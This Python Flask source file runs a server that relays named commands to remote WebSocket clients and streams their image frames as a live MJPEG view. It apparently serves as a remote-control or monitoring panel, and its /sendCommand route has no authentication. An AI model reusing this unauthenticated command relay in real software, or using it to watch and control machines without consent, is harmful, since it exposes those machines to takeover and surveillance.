from flask import Flask, request, jsonify, redirect, url_for, Response
from flask_login import LoginManager # type: ignore # type: ignore
from flask_mail import Mail # type: ignore
from dotenv import load_dotenv # type: ignore
import os
import importlib
import threading
import asyncio
import websockets
import uuid
import ujson as json  # Faster JSON serialization
from socket import gethostname
from db import db
import base64
import logging
import time

# Flask App Initialization
app = Flask(__name__)
load_dotenv()

# Flask Configuration
app.config["SECRET_KEY"] = os.getenv("FLASK_SECRET_KEY")
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
DATABASE_PATH = f"sqlite:///{os.path.join(BASE_DIR, 'Data.db')}"
app.config["SQLALCHEMY_DATABASE_URI"] = DATABASE_PATH 
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = os.getenv("SQLALCHEMY_TRACK_MODIFICATIONS") == "True"
app.config["ENCRYPTION_KEY"] = os.getenv("ENCRYPTION_KEY")

db.init_app(app)

# Email Configuration
app.config["MAIL_SERVER"] = "smtp.gmail.com"
app.config["MAIL_PORT"] = 587
app.config["MAIL_USE_TLS"] = True
app.config["MAIL_USERNAME"] = os.getenv("MAIL_USERNAME")
app.config["MAIL_PASSWORD"] = os.getenv("MAIL_PASSWORD")
app.config["MAIL_DEFAULT_SENDER"] = app.config["MAIL_USERNAME"]


# Flask-Login & Email Configurations
login_manager = LoginManager()
login_manager.init_app(app)

mail = Mail(app)

# Register Blueprints
controllers_dir = os.path.join(os.path.dirname(__file__), "controllers")

def register_blueprints():
    for filename in os.listdir(controllers_dir):
        if filename.endswith(".py") and filename != "__init__.py":
            module_name = f"controllers.{filename[:-3]}"
            module = importlib.import_module(module_name)
            blueprint = getattr(module, f"{filename[:-3]}_bp", None)
            if blueprint:
                app.register_blueprint(blueprint)
                print(f"Registered Blueprint: {blueprint.name}")

register_blueprints()

# Debugging - Print all registered routes
print("\nRegistered Routes:")
for rule in app.url_map.iter_rules():
    print(f"{rule} -> {rule.endpoint}")
print("")

# User Loader for Flask-Login
from models.user import User # type: ignore

@login_manager.user_loader
def load_user(user_id):
    return db.session.get(User, int(user_id))

# Ensure Tables Exist in the Database
with app.app_context():
    db.create_all()

# Homepage Redirection
@app.route("/")
def index():
    return redirect(url_for("home.home"))

# WebSocket Configuration
WS_IP = "0.0.0.0"
WS_PORT = 8001
pending = {}

class Client:
    def __init__(self, client_id, ws):
        self.client_id = client_id
        self.ws = ws

    async def execute(self, function_name, args=None, kwargs=None):
        message_id = str(uuid.uuid4())
        message = json.dumps({
            "type": "call",
            "function": function_name,
            "args": args or [],
            "kwargs": kwargs or {},
            "id": message_id
        })

        future = asyncio.get_event_loop().create_future()
        pending[message_id] = future
        await self.ws.send(message)

        try:
            response = await asyncio.wait_for(future, timeout=3)
        except asyncio.TimeoutError:
            pending.pop(message_id, None)
            raise Exception("Timeout waiting for client response")

        return response.get("result") if "result" in response else Exception(response.get("error"))

class ClientManager:
    def __init__(self):
        self.clients = {}

    def add_client(self, client_id, ws):
        self.clients[client_id] = Client(client_id, ws)

    def remove_client(self, client_id):
        self.clients.pop(client_id, None)

    async def command(self, client_id, function_name, args=None):
        if client_id not in self.clients:
            raise Exception(f"Client '{client_id}' not found")
        return await self.clients[client_id].execute(function_name, args)

client_manager = ClientManager()

async def handle_client(ws):
    client_id = await ws.recv()
    client_manager.add_client(client_id, ws)
    print(f"[+] {client_id} connected.")

    try:
        async for message in ws:
            data = json.loads(message)
            msg_id = data.get("id")
            if msg_id in pending:
                future = pending.pop(msg_id)
                future.set_result(data)
            else:
                print(f"[{client_id}] -> {data}")
    except websockets.exceptions.ConnectionClosed:
        print(f"[-] {client_id} disconnected")
    finally:
        client_manager.remove_client(client_id)

@app.route('/sendCommand', methods=['POST'])
def send_command():
    data = request.get_json()
    client_id = data.get('client_id')
    command = data.get('command')
    args = data.get('args', [])

    try:
        result = asyncio.run(client_manager.command(client_id, command, args))
        return jsonify({"status": "success", "result": result})
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500

# Store latest frame per client for live view
latest_frames = {}
last_frame_log_time = {}

# WebSocket handler for live view frames from client
async def handle_liveview_client(ws):
    try:
        client_id = await ws.recv()
        print(f"[LiveView] {client_id} connected for live view.")
        while True:
            try:
                message = await ws.recv()
                latest_frames[client_id] = message
                now = time.time()
                # Only log every 2 seconds per client
                if (client_id not in last_frame_log_time) or (now - last_frame_log_time[client_id] > 2):
                    print(f"[LiveView] Received frame from {client_id}, size: {len(message)} bytes")
                    last_frame_log_time[client_id] = now
            except websockets.exceptions.ConnectionClosed:
                print(f"[LiveView] {client_id} disconnected from live view.")
                break
            except Exception as e:
                print(f"[LiveView] Error receiving frame from {client_id}: {e}")
    except Exception as e:
        print(f"[LiveView] Error in connection: {e}")
    finally:
        latest_frames.pop(client_id, None)
        last_frame_log_time.pop(client_id, None)

# Start a separate WebSocket server for live view frames
LIVEVIEW_WS_PORT = 4001

def start_liveview_ws_server():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def run_server():
        try:
            async with websockets.serve(handle_liveview_client, WS_IP, LIVEVIEW_WS_PORT, max_size=2*1024*1024):
                print(f"LiveView WebSocket server running at ws://{WS_IP}:{LIVEVIEW_WS_PORT}")
                await asyncio.Future()
        except Exception as e:
            print(f"[LiveView] WebSocket server failed to start: {e}")
    try:
        loop.run_until_complete(run_server())
        loop.run_forever()
    except Exception as e:
        print(f"[LiveView] Event loop error: {e}")

# MJPEG HTTP endpoint
def save_latest_frame(client_id):
    frame = latest_frames.get(client_id)
    if frame:
        try:
            with open(f"/tmp/{client_id}_latest.jpg", "wb") as f:
                f.write(frame)
            print(f"[DEBUG] Saved /tmp/{client_id}_latest.jpg")
        except Exception as e:
            print(f"[DEBUG] Failed to save frame for {client_id}: {e}")

@app.route('/liveview/<client_id>')
def liveview(client_id):
    def generate():
        last_save = 0
        while True:
            try:
                frame = latest_frames.get(client_id)
                if frame:
                    yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
                    now = time.time()
                    if now - last_save > 5:
                        save_latest_frame(client_id)
                        last_save = now
                time.sleep(0.04)  # ~25fps
            except Exception as e:
                print(f"[MJPEG] Error streaming frame for {client_id}: {e}")
                break
    try:
        return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
    except Exception as e:
        print(f"[MJPEG] Error creating response for {client_id}: {e}")
        return Response("Error streaming live view", status=500)

# Start WebSocket Server in Background
def start_ws_server():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def run_server():
        try:
            async with websockets.serve(handle_client, WS_IP, WS_PORT):
                print(f"WebSocket server running at ws://{WS_IP}:{WS_PORT}")
                await asyncio.Future()
        except Exception as e:
            print(f"[CommandWS] WebSocket server failed to start: {e}")
    try:
        loop.run_until_complete(run_server())
        loop.run_forever()
    except Exception as e:
        print(f"[CommandWS] Event loop error: {e}")

# Run Flask and WebSocket Server
if __name__ == '__main__':
    threading.Thread(target=start_ws_server, daemon=True).start()  # Command WebSocket (8001)
    threading.Thread(target=start_liveview_ws_server, daemon=True).start()  # LiveView WebSocket (4001)
    print(f"Starting Flask server on {gethostname()} at http://0.0.0.0:25566")
    app.run(host="0.0.0.0", port=25566, debug=False)
